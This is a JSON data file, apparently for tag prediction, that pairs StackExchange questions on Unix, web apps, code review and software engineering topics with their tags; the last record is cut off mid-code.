    "source": "My cron job is not sending an email with any output, I see only a blank email <eos> Can someone please help me here. My cron job is not sending an email with output. While I run the shell script manually it generates an email with output.Here is the script looks like #!/bin/bashMAILLIST=<email>LogDirectory='/app/oracle/admin/monitor/'DBUSER='rman'DBUSERPASSWORD='rman01'DB='pdcatdb'SUBJECT=RMAN Backup Status ReportORACLE_HOME=/app/oracle/product/12.1.0.2_64${ORACLE_HOME}/bin/sqlplus -s <<EOF  > ${LogDirectory}/query.log${DBUSER}/${DBUSERPASSWORD}@${DB}set pagesize 20000set linesize 2000set wrap offset trimspool onset feedback offset echo offset termout offset heading offset underline offset colsep ','SELECT RTRIM(A.DB_NAME)||'---->'||       LTRIM(A.STATUS) BACKUP_STATUS  FROM rman.RC_RMAN_STATUS A,       (  SELECT DB_NAME, OBJECT_TYPE, MAX (END_TIME) END_TIME            FROM rman.RC_RMAN_STATUS           --WHERE     OBJECT_TYPE IN ('DB FULL', 'DB INCR')           WHERE     OBJECT_TYPE IN ('DB INCR')                 AND STATUS IN ('COMPLETED', 'COMPLETED WITH ERRORS', 'FAILED')                 AND OPERATION IN ('BACKUP', 'BACKUP COPYROLLFORWARD')        GROUP BY DB_NAME, OBJECT_TYPE) B WHERE     A.OBJECT_TYPE IN ('DB FULL', 'DB INCR', 'ARCHIVELOG')       AND STATUS IN ('COMPLETED', 'COMPLETED WITH ERRORS', 'FAILED')       AND OPERATION IN ('BACKUP', 'BACKUP COPYROLLFORWARD')       AND A.DB_NAME = B.DB_NAME       AND A.END_TIME = B.END_TIME       AND A.OBJECT_TYPE = B.OBJECT_TYPE       AND A.end_time > sysdate-7       order by 1       /EOFmailx -s Rman Backup Report <email> < /app/oracle/admin/monitor/query.log",
    "target": "cron;email"
  },
  {
    "id": "_unix.334428",
    "source": "$_SERVER['SCRIPT_URL'] and $_SERVER['SCRIPT_URI'] not appearing when mod_rewrite enabled <eos> I have PHP 7.1 and apache 2.4 running in a docker vm. I have mod rewrite enabled. I have code that needs $_SERVER['SCRIPT_URL'] and $_SERVER['SCRIPT_URI']. These are not set. I created a minimal example that proves it. Do the following in bash:git clone https://github.com/zippy1981/php7-mod_rewrite.gitcd php7-mod_rewritedocker-compose stop && docker-compose rm -fv &&  docker-compose build --force-rm --no-cache && docker-compose up -dcurl localhost:8080/fooThat redirect is enabled by the .htaccess line RewriteRule ^foo$     app.php proving mod_rewrite is installed, enabled, and is touching this particular request. That url returns a JSON version of $_SERVER that looks like this:{    _SERVER: {    REDIRECT_STATUS: 200,    HTTP_HOST: localhost:8080,    HTTP_USER_AGENT: curl\\/7.47.0,    HTTP_ACCEPT: *\\/*,    PATH: \\/usr\\/local\\/sbin:\\/usr\\/local\\/bin:\\/usr\\/sbin:\\/usr\\/bin:\\/sbin:\\/bin,    SERVER_SIGNATURE: <address>Apache\\/2.4.10 (Debian) Server at localhost Port 8080<\\/address>\\n,    SERVER_SOFTWARE: Apache\\/2.4.10 (Debian),    SERVER_NAME: localhost,    SERVER_ADDR: 172.24.0.2,    SERVER_PORT: 8080,    REMOTE_ADDR: 172.24.0.1,    DOCUMENT_ROOT: \\/var\\/www\\/html,    REQUEST_SCHEME: http,    CONTEXT_PREFIX: ,    CONTEXT_DOCUMENT_ROOT: \\/var\\/www\\/html,    SERVER_ADMIN: webmaster@localhost,    SCRIPT_FILENAME: \\/var\\/www\\/html\\/app.php,    REMOTE_PORT: 49122,    REDIRECT_URL: \\/foo,    GATEWAY_INTERFACE: CGI\\/1.1,    SERVER_PROTOCOL: HTTP\\/1.1,    REQUEST_METHOD: GET,    QUERY_STRING: ,    REQUEST_URI: \\/foo,    SCRIPT_NAME: \\/app.php,    PHP_SELF: \\/app.php,    REQUEST_TIME_FLOAT: 1483412792.892,    REQUEST_TIME: 1483412792,    argv: [],    argc: 0    }}This does not have the SCRIPT_URI or SCRIPT_URL environment variables in it. How do I get them to show up?",
    "target": "apache httpd;docker;mod rewrite;php7"
  },
  {
    "id": "_unix.20510",
    "source": "Newly installed Debian install is not recognized <eos> I recently formatted an entire drive so I could install Linux on it. The partitions:15 GB, Primary, sda1, mount point: /232.9 GB Logical, sda5, mount point: /home3 GB Logical, sda6, swapHowever, upon install completion (with the GRUB bootloader) and reboot, the BIOS reports that it cannot find a bootable device.I am thinking that I did not set sda1's bootable flag. If this is the case - is there some way I can do this from the Debian CD's rescue mode?The exact error message from the BIOS is No bootable device -- insert boot disk and press any key.Attempted:Removed all other boot options (CD, USB) from the boot listSwapped cabledTried other SATA portsSwapped hard drives (with new SSD)",
    "target": "debian;boot"
  },
  {
    "id": "_unix.270907",
    "source": "wine - Can I get SWTOR to use backslash and AltGr in keybinds? <eos> I usually play SWTOR on Windows (10), but being able to play on linux would be so much better for too many reasons to list (and beyond the scope of this question). So I've set it up via playonlinux (using wine version 1.8-staging as recommended by a friend).Some of my keybinds have changed, however. On windows, I have one keybind as backslash ('\\') which I use incessantly, and several more as AltGr+, for example AltGr+K, L, Y and so on. These work fine on Windows.However, when I load SWTOR on linux - having installed the EXACT same keybind/interface files (and I know it found them because my chatbox and interface are exactly as they should be, which they weren't before I transferred those configs) - the slot which should be bound to \\ is now bound to #. Attempting to bind it back, I found that it won't even register \\ in the binding dialog box. However, I can easily type backslashes into chat messages, and I can confirm from xkey that the keypress is sent to SWTOR.A similar story with AltGr: using AltGr+F actually invokes the keybind associated with F, and attempting to bind it back just binds it to F instead. I can't check by typing it in chat, but I verified with xkey that the keypress is sent to the window by X. The bindings are still listed with Ctrl+Alt+F, and indeed I can invoke it like that (it's just how it comes up on windows).The weirdest thing about this is that it automatically rebound the \\ binding to #, with no editing of configs and no manual rebinding (and that I can still type \\ into chat, so it's clearly receiving the keypresses). And yet it works fine on Windows.Can anyone shed any light on where these problems are occurring and what might help fix them?I'm running playonlinux 4.2.10 installed from the official website, using the SWTOR script listed when you search for it and the installer from the official swtor.com website. My system is$ lsb_release -aNo LSB modules are available.Distributor ID: DebianDescription:    Debian GNU/Linux 8.3 (jessie)Release:    8.3Codename:   jessie$ uname -srviopmLinux 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) x86_64 unknown unknown GNU/LinuxI have a nvidia 940M graphics card (Optimus) which is used by SWTOR via bumblebee (installed from backports, as is the driver).",
    "target": "keyboard shortcuts;wine;playonlinux"
  },
  {
    "id": "_unix.119132",
    "source": "How can I install Linux on a UEFI system with Secure boot? <eos> My motherboard is a Gigabyte 990XA-UD3 (CPU 1), it's a UEFI -Dual boot, and when I try installing Linux Mint 16 Cinnamon or Ubuntu 13.10 it always bring this error(initramfs) Unable to find a medium containing a live file system.I put all my BIOS config in legacy options, disabled UEFI, but still the same error. Right now I am running Windows 8.1 64bI use Universal USB installer and made a live USB ",
    "target": "linux;security;boot;uefi;initramfs"
  },
  {
    "id": "_webapps.82892",
    "source": "Can I check if an email has been secretly sent from my account? <eos> I want to check if an email has been sent from my email account and then deleted from the sent folder.I had a draft with some personal information on it and it disappeared. I wasn't sure if I had deleted it (I couldn't find it in the Delete folder, or any other folder) or if someone secretly sent it.I'm using Hotmail by the way.",
    "target": "outlook.com"
  },
  {
    "id": "_codereview.800",
    "source": "Strongly-typed reading values from CSV DataTable <eos> Is there a way to do this using parameters so the value is automatically converted to whatever datatype the keyfield has in the datatable?This code should be reusable for future bulk update applications hence the constant and the check on multiple datatypes.private const string DBKEYFIELDNAME = CustomerNr;...    for (int i = 1; i <= csvLines.Length - 1; i++) // i=1 => skip header line{    string[] csvFieldsArray = csvLines[i].Split(';');    int indexKeyField = csvHeaders.IndexOf(CSVKEYFIELDNAME.ToLower());    object csvKeyValue = csvFieldsArray[indexKeyField];    // ... some more code here that is not relevant    // Find the matching row for our csv keyfield value    Type keyType = parameters.DataTableOriginal.Columns[DBKEYFIELDNAME].DataType;    DataRow[] rowsOriginal = null;    if (keyType.IsAssignableFrom(typeof(string)))        rowsOriginal = parameters.DataTableOriginal.Select(DBKEYFIELDNAME + =' + csvKeyValue.ToString() + ');    else if (keyType.IsAssignableFrom(typeof(Int16)) || keyType.IsAssignableFrom(typeof(Int32)) || keyType.IsAssignableFrom(typeof(Int64)) || keyType.IsAssignableFrom(typeof(bool)))        rowsOriginal = parameters.DataTableOriginal.Select(DBKEYFIELDNAME + = + csvKeyValue);    if (rowsOriginal != null && rowsOriginal.Length == 1)    {        // Do some processing of the row here    }}",
    "target": "c#;csv"
  },
  {
    "id": "_softwareengineering.283294",
    "source": "Should all functions be fully self-contained (is it bad practice to share a variable between functions)? <eos> There are two ways to do the same thing (pseudo code)Define databaseHandle in the parent function, and use it as a global in this scope: function API() {  function openDatabase() {      return databaseHandle;  }  databaseHandle = openDatabase()   function getItem(i) {      databaseHandle.get(i)  }  function addItem(name) {      databaseHandle.add(name)  }}Define a function for getting this handle, and then get it when we need it:function API() {  function openDatabase() {      return databaseHandle;  }  function getItem(i) {      databaseHandle = openDatabase()      databaseHandle.get(i)  }  function addItem(name) {      databaseHandle = openDatabase()      databaseHandle.add(name)  }}The first option seems simpler, and I see it in many examples. But the second one seems to me more reliable and obvious in what it does (and a bit redundant).What is the best practice here? If there's another, better way, I'd like to hear about it. Thanks. ",
    "target": "design patterns;object oriented;programming practices;functional programming"
  },
  {
    "id": "_unix.381236",
    "source": "LightDM screen lock in awesome-wm unlocks by itself <eos> I use LightDM with awesome-wm.To lock screen I use command dm-tool lock. Most of the time it works fine but if after issuing the session lock command I switch to another tty and then go back, session unlocks by itself. /etc/lightdm/lightdm.conf is set to all defaults. How can I fix this behavior?Linux 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u2 (2017-06-26)awesome v4.0lightdm 1.18.3-1EDITOutput of the systemctl status lightdm.service command after a couple of locksCGroup: /system.slice/lightdm.service            931 /usr/sbin/lightdm            941 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch           1754 /usr/lib/xorg/Xorg :1 -seat seat0 -auth /var/run/lightdm/root/:1 -nolisten tcp vt8 -novtswitch           1794 lightdm --session-child 15 24           2137 lightdm --session-child 27 30           2192 lightdm --session-child 31 34           2224 lightdm --session-child 35 38           2304 lightdm --session-child 15 20",
    "target": "awesome;screen lock;lightdm"
  },
  {
    "id": "_webapps.13708",
    "source": "How can I get GMail to make the default address I'm sending an email from be the same as the To address in a reply? <eos> I have two email addresses that I use with GMail, let's call them personal@gmail.com and me@mycompany.com, the latter is integrated with SMTP and POP. When I want to send an email I can choose which email address I want to send from. Now let's say I receive an email to me@mycompany.com when I reply I want that reply to come from me@mycompany.com not personal@gmail.com, yet it always defaults to the @gmail.com address. Is there any way to make it default to be from the To address in a reply?",
    "target": "gmail;email;email management"
  },
  {
    "id": "_softwareengineering.158118",
    "source": "I cannot understand the application of oops How can I develop the understanding of application of oops? <eos> I am a developer in PHP technology, I am aware of almost all the basics of OOPS, but still cannot find out the way to apply these concepts over a procedural programming.I do it in very orthodox way, but I don't know why I am coding it in that way. I never have reasoning to justify my OOPS applications, which has inferred me that I am worst in OOPS, Please help me guys to understand the application of OOPS.",
    "target": "object oriented;programming practices;functional programming"
  },
  {
    "id": "_codereview.121740",
    "source": "Email text parser <eos> I am writing a parser to parse out the fields of an email message in the following format (note that I expect that the To: field could contain multiple lines, same with the Subject: field.From: joebloggs@mail.netTo: jane@othermail.com, john@somemail.net,    otherperson@hello.com, onemore@whatever.orgSubject: A subject goes hereX-FileName: joebloggs.pstHi, this is the information you were looking for...Sincerely, JoeI intend to construct an instance of this Mail class:public class Mail {  public List<String> to = new ArrayList<>();  public String subject, from, body;  public String xFileName;}and I am parsing it using the following method:    public class Parser {    public enum CurrentState {        NEW(), FROM(From:), TO(To:),        SUBJECT(Subject:), X_FILENAME(X-FileName),        BODY();        private final String startsWith;        CurrentState(String startsWith) {            this.startsWith = startsWith;        }        public String getStartsWith() {            return startsWith;        }     }    public Mail parseEmail(List<String> lines) throws Exception {      CurrentState currState = NEW;      Mail sentMail = new Mail();      for (String line: lines) {         if (line.startsWith(FROM.getStartsWith())) {            sentMail.from = parseFrom(line);            currState = FROM;         } else if (line.startsWith(TO.getStartsWith())) {            sentMail.to.addAll(parseTo(line));            currState = TO;         } else if (line.startsWith(SUBJECT.getStartsWith())) {            sentMail.subject += parseSubject(line);            currState = SUBJECT;         } else if (line.startsWith(X_FILENAME.getStartsWith())) {            sentMail.xFileName = simpleParse(X_FILENAME, line);            currState = X_FILENAME;         } else if (currState == BODY) {            sentMail.body += line;         } else {            if (currState == X_FILENAME && !line.isEmpty()) {                sentMail.body += line;                currState = BODY;            } else if (currState == TO) {                sentMail.to.addAll(parseTo(line));            } else if (currState == SUBJECT) {                sentMail.subject += parseSubject(line);            } else {                throw new Exception(Could not parse line:  + line +  previous state was:  + currState.name());            }          }         }      }      return sentMail;  }I'm wondering how well this code tolerates badly formatted data, and whether there is a cleaner or more elegant way to implement this parsing functionality.",
    "target": "java;parsing;email"
  },
  {
    "id": "_cs.24652",
    "source": "Proving a language is not decideable using a reduction from Busy Beaver? <eos> I was given this function:$F(n)$ returns the smallest TM (measured in number of states) such that on input $\\epsilon$, the TM makes at least $n$ steps before eventually halting ($n$ is a natural number). I was asked to prove that this function is uncomputable using a reduction from the Busy Beaver. I'm still new to reductions and after sitting on this problem for a while I've gotten nowhere. I'd appreciate any help/guidance. ",
    "target": "formal languages;turing machines;reductions"
  },
  {
    "id": "_unix.220438",
    "source": "GNOME Desktop Dconf Settings Are Present Even Though Using Cinnnamon <eos> I installed cinnamon on Arch. Everything works fine, but a little annoyance I am having is that there are still org.gnome.dekstop settings present. I removed gnome-desktop, which was installed as a dependency by evince (also removed). Are these settings normally present under cinnamon or is there some way to get rid of them? I dislike having the duplicates and I think this also led to a double lock issue where setting disable-lock-screen under org.gnome.desktop.lockdown fixed the issue. Is there a way to completely get rid of gnome-desktop?",
    "target": "linux;arch linux;gnome;cinnamon;dconf"
  },
  {
    "id": "_codereview.113823",
    "source": "Drag and drop GUI with native JavaScript <eos> Currently I'm engaged with implementing a Drag and Drop GUI. I've discovered that there a not many resources (tutorials, etc.) available. So I wrote this:function Cursor(cssSelector, rightLimit, bottomLimit) {    var element = document.querySelector('#square');    var styles = window.getComputedStyle(square);    var x = 0;    var y = 0;    var fromLeft = 0;    var fromTop = 0;    var pushed = false;    var limits = {        top: 0,        right: rightLimit,        bottom: bottomLimit,        left: 0    }    // Uses the offsetX and the offsetY of the     //  mousedown event.    this.setCoordinates = function(left, top) {      if (!fromLeft && !fromTop) {        fromLeft = left;        fromTop = top;      }     }    this.togglePushed = function() {        pushed ? pushed = false : pushed = true;    }    this.getPushed = function() {        return pushed;    }    // Uses the offsetX and the offsetY of the     //   mousemove event.    this.moveCursor = function(offsetX, offsetY) {      // How much have the x and the y coordinate      //   changed since the mousedown event?      var tmpX = offsetX - fromLeft;      var tmpY = offsetY - fromTop;      if ((x + tmpX) <= limits.right && (x + tmpX) >= limits.left &&          (y + tmpY) >= limits.top && (y + tmpY) <= limits.bottom) {        // If the values are valid then store them ...        x += tmpX;        y += tmpY;        // ... and use them to move the element.        element.style.left = x + 'px';        element.style.top = y + 'px';      }    }    }  var cursor = new Cursor('#square', 550, 450);  square.addEventListener('mousedown', function(ev) {    cursor.togglePushed();    cursor.setCoordinates(ev.offsetX, ev.offsetY);  });  document.body.addEventListener('mouseup', function(ev) {    cursor.togglePushed();  });  square.addEventListener('mousemove', function(ev) {    if (cursor.getPushed()) {       cursor.moveCursor(ev.offsetX, ev.offsetY);    }  });body {  background-color: #eefafa;}#wrap {  width: 600px;  margin: 50px auto;}#panel {  height: 500px;  position: relative;  background-color: rgba(150, 150, 150, 0.2);  border-radius: 3px;}#square {  width: 50px;  height: 50px;  background-color: orangered;  border: 1px solid teal;  border-radius: 3px;  position: absolute;  top: 0px;  left: 0px;}.instruct {  font-size: 125%;  font-weight: bold;  font-family: helvetica;}<div id=wrap>  <p class=instruct>      Click the square. Keep the mouse-button pushed and        move the pointer slowly.  </p>  <div id=panel>    <div id=square></div>  </div></div> There's also a demo on CodePen.",
    "target": "javascript;html;css"
  },
  {
    "id": "_cstheory.4161",
    "source": "Why is the free store memory called the heap? <eos> Does it have anything to do with the heap data structure, for example the Buddy blocks implementation, or does it only take the literal English meaning of the word (a big pile)?I know heap memory is more practical than theoretical, but there's no Stack Exchange for Practical Computer Science yet.",
    "target": "ds.data structures;ho.history overview"
  },
  {
    "id": "_unix.287626",
    "source": "Why doesn't grep give me the all found strings? <eos> I have txt file whose inside there are 8 times ATOMIC_POSITIONS string and when I'm trying to write each one of them with ;AtomicPos=$(grep -n ATOMIC_POSITIONS hw1_out_si_wire.txt)echo $AtomicPost gives me just the last one 4779:ATOMIC_POSITIONS (bohr)4779 is the line number , where is the last one.In fact , after that I was going to take the last one so that I can take the next lines after the last ATOMIC_POSITIONS, but, hence, it gives me directly the last one ,so I continued like ;$NtL=262i=1until [ $i == $NtL ]doPos=$(grep -A $i ATOMIC_POSITIONS  hw1_out_si_wire.txt)echo $Posi=$(expr $i + 1)unset PosdoneBut when I run that , it starts from the first ATOMIC_POSITIONS and continues.Could someone explain why is that ?",
    "target": "bash"
  },
  {
    "id": "_cs.41523",
    "source": "Algorithm analysis of nested loop <eos> so I have this code:for (int i=1; i < n; i=i*5)      for (j=i; j < n; j++)        sum = i+j;And I'm wondering, what's the time complexity of this for loop?To start off, I know the first line is logn base 5, with an additional check to exit out of the for loop.Then, for the second line, I have the following:i = 1    j = 1, 2, 3,, n        (n-5^0)+1i = 5    j = 5, 6, 7, , n       (n-5^1)+1i = 25    j = 25, 26, 27,, n     (n-5^2)+1i = n    j = n                   (n-5^k)+1But now, I'm stuck. Any help is appreciated.",
    "target": "algorithms;time complexity;runtime analysis;loops"
  },
  {
    "id": "_unix.16620",
    "source": "What do I install into a given install prefix <eos> Which directories should I expect to have in an install prefix when I'm writing makefiles? I've noticed that in the common prefix /usr, there is no /etc, yet there is an /include dir, which isn't in the root directory. Which paths are hard-coded such as /etc and /var maybe and which directories lie in a prefix? As far as I can see /bin and /lib are standard.",
    "target": "filesystems;software installation;directory structure;make;gnu make"
  },
  {
    "id": "_cs.22030",
    "source": "What is a trampolined interpreter? <eos> Can anyone explain me what is a trampolined interpreter? I am versed with relevant concepts viz. procedural languages, continuations etc but am finding difficulty understanding the definition/need for trampolining. Please help.",
    "target": "programming languages;interpreters"
  },
  {
    "id": "_webapps.74457",
    "source": "Is there any option to operate with 2 lists in one list in Google Sheets? <eos> Is it possible in Google spreadsheets to have one list which is somehow divided into 2 parts and both of those parts consist of different lists? Something like iframes in HTML.",
    "target": "google spreadsheets"
  },
  {
    "id": "_codereview.36743",
    "source": "Is it feasible to create a syslog server which writes to a client dataset? <eos> I'm creating a simple syslog server in Delphi XE2 using Indy's TIdSyslogServer. I've decided to make it dump into a TClientDataSet and display in a TDBGrid, but I'm skeptical about how well it would handle if the log got quite big, and what I should expect when it grows to millions of records. This application is for internal use and I don't intend to make any software from it, and just keep the code real simple.The purpose of the application is for numerous IP surveillance cameras along with various other network based equipment to report their log to one place.This is a simple application with just 1 form, all the code is directly in the form's unit. The actual application is a separate project (call this my SSCCE).uMain.pasunit uMain;interfaceuses  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,  Vcl.Controls, Vcl.Forms, Vcl.Dialogs,  IdSocketHandle, IdBaseComponent, IdComponent, IdSysLogServer, IdSysLog,  IdSysLogMessage, IdUDPBase, IdUDPServer,  Vcl.StdCtrls, Vcl.Grids, Vcl.DBGrids,  Data.DB, Datasnap.DBClient, MidasLib {to avoid requiring MIDAS.DLL};type  TForm1 = class(TForm)    Server: TIdSyslogServer;    DS: TClientDataSet;    DSC: TDataSource;    DBGrid1: TDBGrid;    procedure FormCreate(Sender: TObject);    procedure FormDestroy(Sender: TObject);    procedure ServerSyslog(Sender: TObject;      ASysLogMessage: TIdSysLogMessage; ABinding: TIdSocketHandle);  private    procedure PrepareDS;  public  end;var  Form1: TForm1;implementation{$R *.dfm}procedure TForm1.FormCreate(Sender: TObject);var  H: TIdSocketHandle;begin  PrepareDS;  Server.Bindings.Clear;  H:= Server.Bindings.Add;  H.IP:= '0.0.0.0';     //All IP's  H.Port:= 514;         //syslog standard port 514  Server.Active:= True; //Activate serverend;procedure TForm1.PrepareDS;begin  DS.DisableControls;  try    DS.Close;    DS.FieldDefs.Clear;    DS.FieldDefs.Add('timestamp', ftDateTime);    DS.FieldDefs.Add('pri',       ftInteger);    //Need to convert the next 2 to string    DS.FieldDefs.Add('facility',  ftString,   15);    DS.FieldDefs.Add('severity',  ftString,   15);    DS.FieldDefs.Add('hostname',  ftString,   15);    DS.FieldDefs.Add('message',   ftString,   200);    DS.CreateDataSet;    DS.Open;  finally    DS.EnableControls;  end;end;procedure TForm1.FormDestroy(Sender: TObject);begin  Server.Active:= False;end;procedure TForm1.ServerSyslog(Sender: TObject;  ASysLogMessage: TIdSysLogMessage; ABinding: TIdSocketHandle);begin  DS.Append;    DS['timestamp']:= ASysLogMessage.TimeStamp;    DS['pri']:=       ASysLogMessage.Pri;    DS['facility']:=  ASysLogMessage.Facility;    DS['severity']:=  ASysLogMessage.Severity;    DS['hostname']:=  ASysLogMessage.Hostname;    DS['message']:=   ASysLogMessage.Msg.Content;  DS.Post;end;end.uMain.dfmobject Form1: TForm1  Left = 354  Top = 124  Caption = 'Form1'  ClientHeight = 400  ClientWidth = 597  Color = clBtnFace  Font.Charset = DEFAULT_CHARSET  Font.Color = clWindowText  Font.Height = -11  Font.Name = 'Tahoma'  Font.Style = []  OldCreateOrder = False  OnCreate = FormCreate  OnDestroy = FormDestroy  PixelsPerInch = 96  TextHeight = 13  object DBGrid1: TDBGrid    Left = 0    Top = 48    Width = 597    Height = 352    Align = alBottom    Anchors = [akLeft, akTop, akRight, akBottom]    DataSource = DSC    TabOrder = 0    TitleFont.Charset = DEFAULT_CHARSET    TitleFont.Color = clWindowText    TitleFont.Height = -11    TitleFont.Name = 'Tahoma'    TitleFont.Style = []  end  object Server: TIdSyslogServer    Bindings = <>    OnSyslog = ServerSyslog    Left = 120    Top = 168  end  object DS: TClientDataSet    Aggregates = <>    Params = <>    Left = 168    Top = 168  end  object DSC: TDataSource    DataSet = DS    Left = 200    Top = 168  endendI'm assuming that at some point I should at least make it dump to a file, then start fresh. That's an obvious feature I will need to add. Along with that of course a way to recall the saved logs. That all comes later, but I'm only worried how the client dataset will handle it when it gets very large, and really how I should determine the maximum before I dump it.",
    "target": "performance;logging;delphi;server"
  },
  {
    "id": "_softwareengineering.195040",
    "source": "Is there such a thing as truly random? <eos> I saw a video about random numbers and how the programmer in that video was talking about computers generating pseudo random numbers and that they are not really random. I knew about this.Then he showed the decay of a radioactive material to generate random numbers where he claimed to be truly random. Is there really such a thing? I mean the process of the radioactive material shooting electrons might seem random but is it? Isn't it just a mysterious black box to us simply because we don't know how it really works?Or does randomness just depend on the current level of scientific knowledge?If so, then how come quantum computers are often quoted to be capable of generating truly random numbers? Can they really do this?",
    "target": "computer science;math;random"
  },
  {
    "id": "_unix.295207",
    "source": "Enable/Disable X on an established SSH connection <eos> So at my job I SSH from my CentOS machine to other local CentOS machines. We use an application that runs in both X11 and terminal. Some features are available exclusively in terminal and other features are exclusively in X11. The program auto detects if there is a X display to connect to and will use it if available. It would be nice to be able to quickly toggle between the two version of the application without having to put in an enhancement request. We have a large amount of desktop icons/short cuts without a -X or -Y flag. Is there any way to enable/disable X11 forwarding on a running SSH session that was started without the -X or -Y flag?",
    "target": "ssh;x11"
  },
  {
    "id": "_unix.289326",
    "source": "How would I limit connections to certain services, to be only accesed via a connection coming from a sub-domains? <eos> I have a personall machine running Ubuntu 14.04.4 LTS. I use it to host a Teamspeak and a Minecraft server and also a website.I am trying to make sub-domains to only point to the right services. So for exampleusing panel.domain.com would point only to https://localhost:8000 (CP Panel)Managed to get the CP Panel sorted out, by using a DNS URL Redirect rather than an A Recordusing mc.domain.com would point only to localhost:25565(Minecraft Server)using ts.domain.com would point only to localhost:9987(Teamspeak Server)using domain.com would point only to the website (domain.com/forums/index.php)I managed to do this atleast for connections that come trough a web browser using httpd.conf<VirtualHost *:80>ServerName mc.domain.comredirect / localhost:25565</VirtualHost><VirtualHost *:80>ServerName ts.domain.comredirect / localhost:9987</VirtualHost>But this only applies to connections coming from a web browser, and if i try to connect in Teamspeak using any sub-domain or the domain name it still connects...This is probably useless, and i should just use the domain name, but i would like to have some sorting going on.Is this even possible to do?From what i can figure out it would be something to do with IPTables but i honestly have no clue. Something like this?iptables coming from any ip:25565 to anything else than localhost:25565 Dropiptables coming from any ip:9987 to anything else than localhost:9987 Dropiptables coming from any ip:80 to anything else than localhost:80/8000 DropAm i correct?",
    "target": "networking;firewall;apache httpd"
  },
  {
    "id": "_codereview.27813",
    "source": "Split and word count in go <eos> Could it be written better?package mainimport (    code.google.com/p/go-tour/wc    fmt)func WordCount(s string) map[string]int {    dict := make(map[string]int)    splited := Split(s)    for _, string := range splited {        _, present := dict[string]        if present {            dict[string]++          } else {            dict[string] = 1        }    }    return dict}func Split(s string) []string{    arraySize := 1    for i := 0; i < len(s); i++ {        if s[i] == ' ' {            arraySize++        }    }    array := make([]string, arraySize)    currentStrInd := 0    currentStr :=     for i := 0; i < len(s); i++ {        if s[i] == ' ' {            array[currentStrInd] = currentStr            currentStrInd++            currentStr =         } else {            currentStr += string(s[i])        }    }    array[arraySize - 1] = currentStr    return array;}func main() {    fmt.Println(Split(I am learning Go!))    wc.Test(WordCount)}",
    "target": "strings;go"
  },
  {
    "id": "_webmaster.34252",
    "source": "Redirecting a subdomain from wordpress.com to an external web address <eos> I have a question about redirecting a subdomain of a blog hosted on wordpress.com to an external URL.Given the following:1) I own a domain name foobar.com purchased from another registrar (not from wordpress.com).2) I have purchased the custom domain option on wordpress.com, and have completed the configuration to make foobar.com resolve to foobar.wordpress.com.3) I will establish an external site for a store, such as store.yahoo.com/foobar.4) I want to redirect the subdomain store.foobar.com to store.yahoo.com/foobar.How do I set up the custom DNS records within wordpress.com to accomplish this subdomain redirection, while leaving foobar.com pointed to my Wordpress blog? I suspect that the CNAME directive is involved, but I cannot figure out the required syntax.",
    "target": "wordpress;redirects;url;subdomain"
  },
  {
    "id": "_webmaster.74288",
    "source": "Website pages being generated with mozekcdn-a.akamaihd.net; adware / malware? <eos> I have been getting crawl errors on Google Adsense on a number of pages, all ending in a peculiar suffix mozekcdn-a.akamaihd.net. For examplehttp://my-website.com/mozekcdn-a.akamaihd.nethttp://my-website.com/mozekcdn-a.akamaihd.net/gsd.htmlNow the strange thing is that such pages do not exist at all on my website. And all of a sudden the number of such pages being created has increased in the last 24 hours; all leading to a 404 Not found page.Thus, trying to get to the bottom of this problem, I searched online, and came across some discussions on Stackexchange (this link) and Google Groups (this link). It seems like some more websites are facing this problem, and the initial analysis is that this is some sort of malware / adware. A french website (this link) has given some more details, though I am not sure how authentic this is. I am worried at the moment at the consequences of this issue. Will be great if any of you can check into it and suggest any possible solution.",
    "target": "google;malware"
  },
  {
    "id": "_codereview.18332",
    "source": "ACM API based Java exercise <eos> I came across an exercise (in the book The Art and Science of Java by Eric Roberts) that requires using only GArc and GLine classes to create a lettering library which draws your initials on the canvas. This should be made independent of the GLabel class.Write a GraphicsProgram to draw your initials on the graphics window using only  the GArc and GLine classes rather than GLabel. For example, if I wrote this program, I would want the output to be [an image showing simple letters E S R on a canvas]Think about the best decomposition to use in writing the program. Imagine that  youve been asked to design a more general letter-drawing library. How would you  want the methods in that library to behave in order to make using them as simple as  possible for your clients?I'd like to know the correct approach to use in solving this problem. I'm not sure what I have so far is good enough (I'm thinking it's too long). The questions requires that I use a good Top-Down approach.Here's my code so far://Passes letters to GLetter objects and draws them on the canvaspackage artScienceJavaExercises.chapter8;    package artScienceJavaExercises.chapter8;    import acm.program.*;    //import acm.graphics.*;    public class DrawInitials extends GraphicsProgram{        public void init(){            resize(400,400);        }        public void run(){            //String let = readLine(Letter?: );            letter = new GLetter(l);            add(letter, (getWidth()-letter.getWidth()*2)/2, (getHeight()-letter.getHeight())/2);            add(new GLetter(o), (letter.getX()+letter.getWidth()), letter.getY());        }        private GLetter letter;    }//GLetter Class    package artScienceJavaExercises.chapter8;    import acm.graphics.*;    import java.awt.*;    public class GLetter extends GCompound{        private static final int ONE_THIRD = 30;        private static final int ROW_2_HEIGHT = 40;        private GArc[] arc = new GArc[4];        private GLine[] line = new GLine[24];        public GLetter(String s){            line[0] = new GLine(0,0, ONE_THIRD, 0);            line[1] = new GLine(ONE_THIRD,0, ONE_THIRD*2, 0);            line[2] = new GLine(ONE_THIRD*2,0, ONE_THIRD*3, 0);            line[3] = new GLine(0,0, 0,ONE_THIRD);            line[4] = new GLine(ONE_THIRD,0, ONE_THIRD, ONE_THIRD);            line[5] = new GLine(ONE_THIRD*2,0, ONE_THIRD*2, ONE_THIRD);            line[6] = new GLine(ONE_THIRD*3,0, ONE_THIRD*3, ONE_THIRD);            line[7] = new GLine(0,ONE_THIRD, ONE_THIRD*2, ONE_THIRD);            line[8] = new GLine(ONE_THIRD,ONE_THIRD, ONE_THIRD*2, ONE_THIRD);            line[9] = new GLine(ONE_THIRD*2,ONE_THIRD, ONE_THIRD*3, ONE_THIRD);            line[10] = new GLine(0,ONE_THIRD, 0, ONE_THIRD+ROW_2_HEIGHT);            line[11] = new GLine(ONE_THIRD, ONE_THIRD, ONE_THIRD, ONE_THIRD+ROW_2_HEIGHT);            line[12] = new GLine(ONE_THIRD*2,ONE_THIRD, ONE_THIRD*2, ONE_THIRD+ROW_2_HEIGHT);            line[13] = new GLine(ONE_THIRD*3,ONE_THIRD, ONE_THIRD*3, 